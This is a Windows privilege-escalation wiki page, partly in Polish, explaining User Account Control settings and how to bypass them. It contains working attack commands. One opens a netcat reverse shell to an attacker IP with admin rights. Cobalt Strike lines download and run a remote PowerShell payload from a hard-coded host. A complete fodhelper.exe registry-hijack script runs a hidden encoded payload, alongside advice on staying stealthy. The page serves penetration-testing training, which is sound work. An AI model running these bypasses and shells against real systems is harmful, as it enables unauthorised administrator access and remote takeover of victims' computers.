# UAC - Kontrola kont użytkowników

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja, która wymusza wyświetlanie **monitu o zgodę przy czynnościach wymagających podwyższenia uprawnień**. Aplikacje mają różne poziomy `integrity`, a program o **wysokim poziomie** może wykonywać zadania, które **potencjalnie mogą zagrozić systemowi**. Gdy UAC jest włączony, aplikacje i zadania zawsze **uruchamiają się w kontekście konta niebędącego administratorem**, chyba że administrator wyraźnie zezwoli tym aplikacjom/zadaniom na dostęp z uprawnieniami administratora. Jest to funkcja ułatwiająca pracę chroniąca administratorów przed niezamierzonymi zmianami, ale nie jest uznawana za granicę bezpieczeństwa.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Gdy UAC jest aktywny, użytkownik należący do grupy administratorów otrzymuje 2 tokeny: token standardowego użytkownika do wykonywania zwykłych czynności oraz token z uprawnieniami administratora.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) omawia działanie UAC bardzo szczegółowo i obejmuje proces logowania, doświadczenie użytkownika oraz architekturę UAC. Administratorzy mogą używać zasad zabezpieczeń do konfiguracji działania UAC odpowiednio do organizacji na poziomie lokalnym (używając secpol.msc), lub konfigurować i dystrybuować je przez Group Policy Objects (GPO) w środowisku domeny Active Directory. Różne ustawienia opisano szczegółowo [here]. Istnieje 10 ustawień Group Policy, które można ustawić dla UAC. Poniższa tabela zawiera dodatkowe szczegóły:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Wyłączone                                                    |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Wyłączone                                                    |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Monit o zgodę dla binarek spoza Windows                      |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Wymagaj poświadczeń na bezpiecznym pulpicie                  |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Włączone (domyślnie dla Home), Wyłączone (domyślnie dla Enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Wyłączone                                                    |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Włączone                                                     |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Włączone                                                     |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Włączone                                                     |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Włączone                                                     |

### Teoria omijania UAC

Niektóre programy są **automatycznie podwyższane (autoelevated)**, jeśli **użytkownik należy** do **grupy administratorów**. Te binaria mają w swoich _**Manifestach**_ opcję _**autoElevate**_ z wartością _**True**_. Plik wykonywalny musi być również **podpisany przez Microsoft**.

Wiele procesów auto-elevate udostępnia **funkcjonalność przez obiekty COM lub serwery RPC**, które można wywołać z procesów działających z medium integrity (z uprawnieniami zwykłego użytkownika). Uwaga: COM (Component Object Model) i RPC (Remote Procedure Call) to metody, których programy Windows używają do komunikacji i wykonywania funkcji pomiędzy różnymi procesami. Na przykład **`IFileOperation COM object`** jest zaprojektowany do obsługi operacji na plikach (kopiowanie, usuwanie, przenoszenie) i może automatycznie podwyższać uprawnienia bez wyświetlania monitu.

Warto zauważyć, że mogą być wykonywane pewne kontrole, np. sprawdzanie, czy proces został uruchomiony z katalogu **System32**, co można obejść np. poprzez **wstrzyknięcie do explorer.exe** lub innego pliku wykonywalnego znajdującego się w System32.

Innym sposobem na obejście tych sprawdzeń jest modyfikacja **PEB**. Każdy proces w Windows ma Process Environment Block (PEB), który zawiera istotne dane o procesie, takie jak ścieżka do pliku wykonywalnego. Poprzez modyfikację PEB, atakujący mogą sfałszować (spoofować) lokalizację własnego złośliwego procesu, sprawiając, że będzie wyglądał, jakby uruchamiał się z zaufanego katalogu (np. System32). Tak sfingowane informacje oszukują obiekt COM, skłaniając go do automatycznego podwyższenia uprawnień bez monitu użytkownika.

Aby **obejść** **UAC** (podnieść poziom z **medium** integrity do **high**), niektórzy atakujący używają takiego typu binariów do **uruchamiania dowolnego kodu**, ponieważ zostanie on wykonany w procesie o **wysokim poziomie integralności**.

Możesz **sprawdzić** _**Manifest**_ binarki przy użyciu narzędzia _**sigcheck.exe**_ z Sysinternals (`sigcheck.exe -m <file>`). A poziom **integrity** procesów można zobaczyć przy pomocy _Process Explorer_ lub _Process Monitor_ (Sysinternals).

### Sprawdzenie UAC

Aby sprawdzić, czy UAC jest włączony, wykonaj:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Jeśli wartość to **`1`**, to UAC jest **aktywny**, jeśli to **`0`** lub nie istnieje, to UAC jest **nieaktywny**.

Następnie sprawdź, **jaki poziom** jest skonfigurowany:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Jeśli **`0`** to UAC nie będzie wyświetlać monitów (czyli **wyłączony**)
- Jeśli **`1`** administrator jest **prosiony o nazwę użytkownika i hasło** aby uruchomić binarkę z wysokimi uprawnieniami (na Secure Desktop)
- Jeśli **`2`** (**Zawsze powiadamiaj mnie**) UAC zawsze poprosi administratora o potwierdzenie, gdy spróbuje uruchomić coś z wysokimi uprawnieniami (na Secure Desktop)
- Jeśli **`3`** jak `1` ale niekoniecznie na Secure Desktop
- Jeśli **`4`** jak `2` ale niekoniecznie na Secure Desktop
- Jeśli **`5`**(**domyślnie**) będzie prosić administratora o potwierdzenie uruchomienia binarek niebędących częścią Windows z wysokimi uprawnieniami

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Zauważ, że jeśli masz graficzny dostęp do ofiary, obejście UAC jest proste — możesz po prostu kliknąć "Yes", gdy pojawi się monit UAC

The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.

It is important to mention that it is **much harder to bypass the UAC if it is in the highest security level (Always) than if it is in any of the other levels (Default).**

### UAC disabled

If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **wykonać reverse shell z admin privileges** (high integrity level) using something like:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Bardzo** podstawowy UAC "bypass" (pełny dostęp do systemu plików)

Jeśli masz shell z użytkownikiem należącym do grupy Administrators możesz **zamontować udział C$** przez SMB (system plików) lokalnie jako nowy dysk i będziesz mieć **dostęp do wszystkiego w systemie plików** (nawet folderu domowego Administratora).

> [!WARNING]
> **Wygląda na to, że ten trik już nie działa**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass z cobalt strike

Techniki Cobalt Strike będą działać tylko wtedy, gdy UAC nie jest ustawiony na maksymalnym poziomie zabezpieczeń.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** mają także kilka modułów do **bypass** **UAC**.

### KRBUACBypass

Dokumentacja i narzędzie w [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) które jest **kompilacją** kilku exploitów omijających UAC. Zauważ, że będziesz musiał **skompilować UACME przy użyciu visual studio lub msbuild**. Proces kompilacji utworzy kilka plików wykonywalnych (np. `Source\Akagi\outout\x64\Debug\Akagi.exe`), będziesz musiał wiedzieć **który z nich potrzebujesz.**\
Powinieneś **zachować ostrożność**, ponieważ niektóre bypasses spowodują, że **inne programy wyświetlą monity**, które **zaalarmują** **użytkownika**, że coś się dzieje.

UACME zawiera **wersję build, od której każda technika zaczęła działać**. Możesz wyszukać technikę dotyczącą twoich wersji:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ponadto, korzystając z [this](https://en.wikipedia.org/wiki/Windows_10_version_history), uzyskasz wydanie Windows `1607` na podstawie numerów build.

### UAC Bypass – fodhelper.exe (Registry hijack)

Zaufany binarny plik `fodhelper.exe` jest automatycznie podnoszony w nowoczesnych Windows. Po uruchomieniu sprawdza ścieżkę rejestru przypisaną do użytkownika (per-user) podaną poniżej, nie weryfikując werbu `DelegateExecute`. Umieszczenie tam polecenia pozwala procesowi o Medium Integrity (użytkownik jest w Administrators) uruchomić proces o High Integrity bez monitu UAC.

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Kroki PowerShell (ustaw payload, a następnie uruchom):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notatki:
- Działa, gdy bieżący użytkownik jest członkiem grupy Administrators i poziom UAC jest domyślny/łagodny (nie Always Notify z dodatkowymi ograniczeniami).
- Użyj ścieżki `sysnative`, aby uruchomić 64-bitowy PowerShell z 32-bitowego procesu na 64-bitowym Windows.
- Payload może być dowolnym poleceniem (PowerShell, cmd lub ścieżka do EXE). Unikaj wywoływania UIs z monitami, aby pozostać stealth.

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

Możesz to uzyskać używając sesji **meterpreter**. Zmigruj do **procesu**, który ma wartość **Session** równą **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ powinien działać)

### UAC Bypass with GUI

Jeśli masz dostęp do **GUI możesz po prostu zaakceptować monit UAC** gdy się pojawi, naprawdę nie potrzebujesz wtedy obejścia. Zatem uzyskanie dostępu do GUI pozwoli ci obejść UAC.

Co więcej, jeśli uzyskasz sesję GUI, której ktoś używał (potencjalnie przez RDP), istnieją **niektóre narzędzia, które będą działać jako administrator**, z których możesz na przykład **uruchomić** **cmd** **as admin** bez ponownego wyświetlania monitu UAC, np. [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). To może być trochę bardziej **stealthy**.

### Noisy brute-force UAC bypass

Jeśli nie zależy ci na byciu głośnym, możesz zawsze **uruchomić coś takiego jak** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), które **będzie prosić o podniesienie uprawnień aż użytkownik to zaakceptuje**.

### Your own bypass - Basic UAC bypass methodology

Jeśli spojrzysz na **UACME** zauważysz, że **większość obejść UAC wykorzystuje podatność Dll Hijacking** (głównie poprzez zapisanie złośliwej dll w _C:\Windows\System32_). [Przeczytaj to, aby dowiedzieć się jak znaleźć podatność Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
2. **IFileOperation**: Windows 10.
4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.

### Another UAC bypass technique

Polega na obserwowaniu, czy **autoElevated binary** próbuje **odczytać** z **registry** **nazwę/ścieżkę** **binary** lub **command**, które mają zostać **wykonane** (to jest bardziej interesujące, jeśli binarka szuka tych informacji w **HKCU**).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
